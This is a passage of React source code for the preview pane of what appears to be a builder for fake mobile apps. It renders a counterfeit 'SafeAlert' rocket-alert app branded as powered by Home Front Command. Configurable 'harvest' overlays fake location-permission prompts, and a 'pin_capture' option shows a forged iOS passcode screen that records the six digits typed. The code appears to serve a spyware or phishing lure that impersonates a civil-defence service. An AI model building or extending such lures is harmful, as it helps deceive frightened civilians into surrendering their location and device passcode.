            <div style={{ fontSize: 10, color: '#8e8e93', marginBottom: 6 }}>No family contacts added</div>
            <button style={{ fontSize: 10, color: accent, background: 'none', border: `1px solid ${accent}`, borderRadius: 7, padding: '4px 12px', cursor: 'pointer' }}>+ Add Family Member</button>
          </div>
        </div>
      </>)}

      {/* ── SETTINGS ── */}
      {tab === 'settings' && (<>
        <Navbar title="Settings" />
        <div style={{ flex: 1, overflowY: 'auto', paddingBottom: 56 }}>
          <div style={{ padding: '8px 10px 2px', fontSize: 10, color: '#8e8e93', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.07em' }}>Notifications</div>
          {[['Rocket Alerts',true],['Shelter Updates',true],['Weather Warnings',true],['Community Alerts',false]].map(([k,on]) => (
            <div key={k} style={{ margin: '0 10px 1px', background: '#fff', padding: '8px 10px', display: 'flex', alignItems: 'center', gap: 8, borderBottom: '0.5px solid #f2f2f7' }}>
              <span style={{ fontSize: 11, color: '#1c1c1e', flex: 1 }}>{k}</span>
              <div style={{ width: 36, height: 22, borderRadius: 11, background: on ? '#34c759' : '#e5e5ea', position: 'relative', flexShrink: 0 }}>
                <div style={{ position: 'absolute', top: 2, left: on ? 16 : 2, width: 18, height: 18, borderRadius: '50%', background: '#fff', boxShadow: '0 1px 3px rgba(0,0,0,.2)', transition: 'left 0.2s' }} />
              </div>
            </div>
          ))}
          <div style={{ padding: '8px 10px 2px', fontSize: 10, color: '#8e8e93', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.07em', marginTop: 6 }}>Location</div>
          {[['Location Services',true],['Precision Location',true]].map(([k,on]) => (
            <div key={k} style={{ margin: '0 10px 1px', background: '#fff', padding: '8px 10px', display: 'flex', alignItems: 'center', gap: 8, borderBottom: '0.5px solid #f2f2f7' }}>
              <span style={{ fontSize: 11, color: '#1c1c1e', flex: 1 }}>{k}</span>
              <div style={{ width: 36, height: 22, borderRadius: 11, background: on ? '#34c759' : '#e5e5ea', position: 'relative', flexShrink: 0 }}>
                <div style={{ position: 'absolute', top: 2, left: on ? 16 : 2, width: 18, height: 18, borderRadius: '50%', background: '#fff', boxShadow: '0 1px 3px rgba(0,0,0,.2)' }} />
              </div>
            </div>
          ))}
          <div style={{ padding: '14px 10px 4px', fontSize: 9, color: '#aeaeb2', textAlign: 'center' }}>
            SafeAlert v3.2.1 · Powered by Home Front Command
          </div>
        </div>
      </>)}

      {/* ── TAB BAR ── */}
      <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 56, background: 'rgba(249,249,249,0.94)', borderTop: '0.5px solid #e5e5ea', backdropFilter: 'blur(20px)', display: 'flex', alignItems: 'flex-start', justifyContent: 'space-around', paddingTop: 6 }}>
        {TABS_DEF.map(t => (
          <div key={t.key} onClick={() => setTab(t.key)} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2, cursor: 'pointer', color: tab === t.key ? accent : '#8e8e93', minWidth: 40 }}>
            {t.svg}
            <span style={{ fontSize: 8, fontWeight: tab === t.key ? 600 : 400 }}>{t.label}</span>
          </div>
        ))}
      </div>

      {/* ── HARVEST OVERLAY ── */}
      {currentHarvest && (
        <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.45)', display: 'flex', alignItems: 'flex-end', zIndex: 20 }}>
          <div style={{ background: '#1c1c1e', borderRadius: '12px 12px 0 0', width: '100%', padding: '14px 12px 22px' }}>
            <div style={{ fontSize: 13, fontWeight: 700, color: '#fff', marginBottom: 5 }}>{currentHarvest.title || `"${appName || 'SafeAlert'}" Wants to Access Your Location`}</div>
            <div style={{ fontSize: 11, color: 'rgba(235,235,245,0.6)', lineHeight: 1.5, marginBottom: 12 }}>{currentHarvest.body || 'Allow while using the app'}</div>
            <div style={{ display: 'flex', gap: 7 }}>
              <button onClick={() => setCurrentHarvest(null)} style={{ flex: 1, padding: '9px 0', borderRadius: 8, border: 'none', background: 'rgba(255,255,255,0.1)', color: '#fff', fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>Don't Allow</button>
              <button onClick={() => setCurrentHarvest(null)} style={{ flex: 1, padding: '9px 0', borderRadius: 8, border: 'none', background: '#0a84ff', color: '#fff', fontSize: 11, fontWeight: 700, cursor: 'pointer' }}>Allow</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function PinMockup({ onClose }) {
  const [digits, setDigits] = useState([]);
  const now = new Date();
  const timeStr = now.toLocaleTimeString('en', { hour: '2-digit', minute: '2-digit', hour12: false });
  const dateStr = now.toLocaleDateString('en', { weekday: 'long', month: 'long', day: 'numeric' });

  function pressDigit(d) {
    if (digits.length >= 6) return;
    const next = [...digits, d];
    setDigits(next);
    if (next.length === 6) setTimeout(() => setDigits([]), 700);
  }

  const rows = [[1,2,3],[4,5,6],[7,8,9],[null,0,'⌫']];
  const subs = {2:'ABC',3:'DEF',4:'GHI',5:'JKL',6:'MNO',7:'PQRS',8:'TUV',9:'WXYZ',0:'+'};

  return (
    <div style={{ position: 'absolute', inset: 0, zIndex: 30, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px 14px', backdropFilter: 'blur(30px) saturate(180%)', background: 'rgba(0,0,0,0.35)' }}>
      <div style={{ textAlign: 'center', marginTop: 4 }}>
        <div style={{ fontSize: 46, fontWeight: 100, color: '#fff', letterSpacing: -1, lineHeight: 1 }}>{timeStr}</div>
        <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.75)', marginTop: 2 }}>{dateStr}</div>
      </div>
      <div style={{ textAlign: 'center' }}>
        <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.7)', marginBottom: 10 }}>Enter Passcode</div>
        <div style={{ display: 'flex', gap: 12, justifyContent: 'center', marginBottom: 16 }}>
          {[0,1,2,3,4,5].map(i => (
            <div key={i} style={{ width: 11, height: 11, borderRadius: '50%', border: '1.5px solid rgba(255,255,255,0.5)', background: i < digits.length ? '#fff' : 'transparent' }} />
          ))}
        </div>
        {rows.map((row, ri) => (
          <div key={ri} style={{ display: 'flex', gap: 10, justifyContent: 'center', marginBottom: 8 }}>
            {row.map((d, ci) => d === null ? <div key={ci} style={{ width: 52, height: 52 }} /> : (
              <button key={ci} onClick={() => d === '⌫' ? setDigits(p => p.slice(0,-1)) : pressDigit(d)} style={{
                width: 52, height: 52, borderRadius: '50%', border: 'none',
                background: 'rgba(255,255,255,0.18)', backdropFilter: 'blur(8px)',
                color: '#fff', cursor: 'pointer', display: 'flex', flexDirection: 'column',
                alignItems: 'center', justifyContent: 'center', gap: 0,
              }}>
                <span style={{ fontSize: 20, fontWeight: 300, lineHeight: 1.1 }}>{d}</span>
                {subs[d] && <span style={{ fontSize: 7, letterSpacing: '0.12em', opacity: 0.7 }}>{subs[d]}</span>}
              </button>
            ))}
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', justifyContent: 'space-between', width: '100%', paddingBottom: 2 }}>
        <span style={{ fontSize: 11, color: '#fff', cursor: 'pointer' }}>Emergency</span>
        <span style={{ fontSize: 11, color: '#fff', cursor: 'pointer' }} onClick={onClose}>Cancel</span>
      </div>
    </div>
  );
}

function PhonePreview({ tpl }) {
  const [splashVisible, setSplashVisible] = useState(true);
  const [pinVisible, setPinVisible] = useState(false);
  const splash = tpl?.splash || {};
  const uiType = tpl?.ui_type || 'white';

  useEffect(() => {
    setSplashVisible(true);
    if (!splash.enabled) return;
    const t = setTimeout(() => setSplashVisible(false), splash.duration || 1800);
    return () => clearTimeout(t);
  // Re-trigger whenever splash fields or tpl id changes so preview stays live
  }, [tpl?.id, splash.enabled, splash.duration, splash.bg, splash.accent, splash.title, splash.subtitle]);

  const splashBg = splash.bg || '#ffffff';
  const splashAccent = splash.accent || '#007aff';

  const screenBg = uiType === 'builtin' ? '#f2f2f7' : '#fff';

  return (
    <div style={{ flexShrink: 0, width: 252, display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
      <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase', color: C.text2, marginBottom: 10 }}>Preview</div>

      {/* Phone frame */}
      <div style={{
        width: 228,
        height: 478,
        background: '#111',
        borderRadius: 44,
        padding: 9,
        boxShadow: '0 24px 64px rgba(0,0,0,0.55), inset 0 0 0 1.5px rgba(255,255,255,0.1), 0 0 0 1px rgba(0,0,0,0.8)',
        position: 'relative',
        flexShrink: 0,
      }}>
        {/* Side buttons */}
        <div style={{ position: 'absolute', left: -3, top: 88, width: 3, height: 26, background: '#2a2a2a', borderRadius: '3px 0 0 3px' }} />
        <div style={{ position: 'absolute', left: -3, top: 122, width: 3, height: 42, background: '#2a2a2a', borderRadius: '3px 0 0 3px' }} />
        <div style={{ position: 'absolute', left: -3, top: 172, width: 3, height: 42, background: '#2a2a2a', borderRadius: '3px 0 0 3px' }} />
        <div style={{ position: 'absolute', right: -3, top: 128, width: 3, height: 58, background: '#2a2a2a', borderRadius: '0 3px 3px 0' }} />

        {/* Screen */}
        <div style={{
          width: '100%', height: '100%',
          borderRadius: 36, overflow: 'hidden',
          background: '#000', position: 'relative',
          display: 'flex', flexDirection: 'column',
        }}>
          {/* Status bar with Dynamic Island */}
          <div style={{ height: 42, background: screenBg, flexShrink: 0, display: 'flex', alignItems: 'flex-start', justifyContent: 'center', paddingTop: 10, position: 'relative', zIndex: 2 }}>
            <div style={{ width: 70, height: 20, background: '#111', borderRadius: 10 }} />
            <div style={{ position: 'absolute', left: 14, top: 14, fontSize: 9, color: '#1c1c1e', fontFamily: '-apple-system,sans-serif', fontWeight: 600 }}>9:41</div>
            <div style={{ position: 'absolute', right: 14, top: 13, fontSize: 8, color: '#1c1c1e', fontFamily: '-apple-system,sans-serif' }}>&#9679;&#9679;&#9679;</div>
          </div>

          {/* App content */}
          <div style={{ flex: 1, position: 'relative', overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
            {uiType === 'white' && <div style={{ flex: 1, background: '#fff' }} />}
            {uiType === 'spinner' && (
              <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#fff' }}>
                <div style={{ width: 30, height: 30, border: '3px solid #e5e5ea', borderTopColor: '#007aff', borderRadius: '50%', animation: 'wc-preview-spin 0.8s linear infinite' }} />
                <style>{`@keyframes wc-preview-spin{to{transform:rotate(360deg)}}`}</style>
              </div>
            )}
            {uiType === 'html' && (
              <iframe
                sandbox="allow-scripts"
                srcDoc={tpl.ui_html || '<html><body style="margin:0;background:#fff;"></body></html>'}
                style={{ flex: 1, border: 'none', width: '100%', height: '100%' }}
                title="html-preview"
              />
            )}
            {(uiType === 'builtin' || (uiType !== 'white' && uiType !== 'spinner' && uiType !== 'html')) && (
              <SafeAlertMockup appName={tpl?.app_name} harvest={tpl?.harvest || []} />
            )}

            {/* PIN overlay */}
            {pinVisible && <PinMockup onClose={() => setPinVisible(false)} />}

            {/* Splash overlay */}
            {!pinVisible && splash.enabled && splashVisible && (
              <div
                onClick={() => setSplashVisible(false)}
                style={{
                  position: 'absolute', inset: 0, background: splashBg, zIndex: 10,
                  display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 10,
                  cursor: 'pointer',
                }}
              >
                {tpl.app_icon_b64 ? (
                  <img src={tpl.app_icon_b64} alt="" style={{ width: 54, height: 54, borderRadius: 14 }} />
                ) : (
                  <div style={{ width: 54, height: 54, borderRadius: 14, background: splashAccent }} />
                )}
                {splash.title && (
                  <div style={{ fontSize: 15, fontWeight: 700, color: '#1c1c1e', fontFamily: '-apple-system,sans-serif', textAlign: 'center', padding: '0 12px' }}>
                    {splash.title}
                  </div>
                )}
                {splash.subtitle && (
                  <div style={{ fontSize: 10, color: '#6e6e73', fontFamily: '-apple-system,sans-serif' }}>
                    {splash.subtitle}
                  </div>
                )}
                <div style={{ fontSize: 9, color: '#aeaeb2', marginTop: 4, fontFamily: '-apple-system,sans-serif' }}>tap to dismiss</div>
              </div>
            )}
          </div>

          {/* Home indicator */}
          <div style={{ height: 26, background: screenBg, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div style={{ width: 76, height: 4, borderRadius: 2, background: '#1c1c1e', opacity: 0.18 }} />
          </div>
        </div>
      </div>

      {/* Controls under phone */}
      <div style={{ marginTop: 10, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 6 }}>
        {splash.enabled && !splashVisible && (
          <button onClick={() => setSplashVisible(true)} style={{ fontSize: 11, color: C.accent, background: 'none', border: 'none', cursor: 'pointer', fontFamily: sans }}>
            Replay Splash
          </button>
        )}
        {tpl?.harvest?.some(h => h.permission === 'pin_capture') && (
          <button onClick={() => setPinVisible(v => !v)} style={{ fontSize: 11, color: '#ff3b30', background: 'none', border: '1px solid rgba(255,59,48,0.3)', borderRadius: 5, padding: '2px 10px', cursor: 'pointer', fontFamily: sans }}>
            {pinVisible ? 'Hide PIN Screen' : 'Preview PIN Screen'}
          </button>
        )}
        <div style={{ fontSize: 10, color: C.text2, background: C.surface2, borderRadius: 4, padding: '2px 8px', letterSpacing: '0.05em' }}>
          {uiType}
        </div>
      </div>
    </div>
  );
}
